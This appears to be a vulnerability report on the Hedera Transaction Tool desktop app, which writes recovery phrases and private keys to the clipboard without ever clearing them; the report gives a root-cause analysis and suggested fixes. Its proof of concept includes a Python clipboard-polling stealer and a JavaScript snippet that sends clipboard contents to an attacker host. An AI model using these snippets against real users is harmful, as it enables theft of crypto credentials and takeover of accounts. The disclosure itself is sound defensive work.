### Title
Recovery Phrase and Private Key Written to System Clipboard Without Clearing — Persistent Sensitive Credential Exposure

### Summary
The Hedera Transaction Tool desktop application (Electron) writes the full 24-word recovery phrase and decrypted private keys to the system clipboard via `navigator.clipboard.writeText()` in multiple UI flows. The clipboard is never cleared after the copy operation. Any process on the host machine or any browser tab with clipboard permission can silently read these credentials at any time after the user clicks "Copy," enabling complete account takeover.

### Finding Description

**Root cause:** Three separate code paths write high-value secrets to the unguarded system clipboard with no subsequent clearing:

**Path 1 — Recovery phrase during account setup:**
`handleCopyRecoveryPhrase()` in `Generate.vue` writes all 24 mnemonic words as a comma-separated string to the clipboard. [1](#0-0) 

**Path 2 — Recovery phrase during migration:**
`copyRecoveryPhrase()` in `Summary.vue` writes `user.recoveryPhrase?.words.join(', ')` to the clipboard. [2](#0-1) 

**Path 3 — Decrypted private key in the Keys settings tab:**
`handleCopy()` in `KeysTab.vue` is a generic clipboard writer called with the decrypted raw private key string when the user clicks the copy icon next to a revealed private key. [3](#0-2) 

The decrypted private key value passed to `handleCopy` comes directly from the in-memory `decryptedKeys` array: [4](#0-3) 

**No clipboard clearing exists anywhere in the codebase.** After `writeText()` resolves, the secret remains in the OS clipboard indefinitely until the user manually overwrites it or reboots.

### Impact Explanation

- **Recovery phrase (Paths 1 & 2):** A 24-word BIP-39 mnemonic is the root secret from which all Hedera key pairs are derived. Theft of this phrase gives an attacker full, permanent control over every account protected by any key derived from it — including the ability to sign and submit arbitrary Hedera transactions (transfers, account updates, deletions).
- **Private key (Path 3):** Direct theft of a raw private key gives an attacker signing authority over the specific Hedera account(s) associated with that key, enabling unauthorized fund transfers and account mutations.
- The clipboard persists across application sessions on all major OSes. The secret is accessible to every process running under the same user account.

### Likelihood Explanation

The attacker preconditions are minimal and realistic:

1. **Local process:** Any background process (malware, a compromised dependency, a script) running as the same OS user can call the OS clipboard API and read the contents — no elevated privileges required.
2. **Malicious web page:** A browser tab that has been granted clipboard read permission (or that tricks the user into granting it via the Permissions API) can call `navigator.clipboard.readText()` and exfiltrate the secret remotely. This is exactly the attack demonstrated in the referenced external PoC videos.
3. **No user interaction required after the copy:** The attacker only needs to poll the clipboard at any point after the user clicks "Copy." The window of exposure is unbounded.

The "Copy" button is a prominently exposed UI feature that users are expected to use during normal onboarding and key management flows, making exploitation highly likely in practice.

### Recommendation

1. **Clear the clipboard automatically** after a short timeout (e.g., 30–60 seconds) following any write of a secret. In Electron's main process, use `electron.clipboard.writeText('')` via an IPC call triggered by a `setTimeout`.
2. **Avoid clipboard for secrets entirely.** Replace the copy-to-clipboard pattern for recovery phrases and private keys with a secure in-app display (e.g., a modal that shows the value only while open and never touches the OS clipboard).
3. **Use Electron's `safeStorage` or OS-level secret APIs** for any operation that must persist sensitive material, rather than the shared system clipboard.
4. If clipboard copy must be retained, **immediately overwrite** the clipboard after the user acknowledges the copy (e.g., on modal close or navigation away from the page).

### Proof of Concept

**Step 1 — Trigger clipboard write (recovery phrase):**
- Launch the Hedera Transaction Tool desktop app.
- Begin account setup → navigate to the Generate Recovery Phrase screen.
- Click the **Copy** button (`data-testid="button-copy"`).
- `handleCopyRecoveryPhrase()` executes `navigator.clipboard.writeText(words.value.join(', '))`.

**Step 2 — Exfiltrate from a concurrent process (local attacker):**
```python
import subprocess, time
# Poll clipboard every second
while True:
    result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'],
                            capture_output=True, text=True)
    data = result.stdout
    if len(data.split(',')) >= 12:  # looks like a mnemonic
        print("STOLEN:", data)
        break
    time.sleep(1)
```

**Step 3 — Exfiltrate from a malicious web page (remote attacker):**
```javascript
// Runs in a browser tab that has clipboard-read permission
navigator.clipboard.readText().then(text => {
  fetch('https://attacker.example.com/steal?data=' + encodeURIComponent(text));
});
```

**Expected outcome:** The attacker receives the full 24-word recovery phrase (or raw private key for Path 3) with no interaction beyond the user clicking the in-app Copy button. The same attack applies to the migration summary flow (`Summary.vue`) and the private key copy in `KeysTab.vue`.
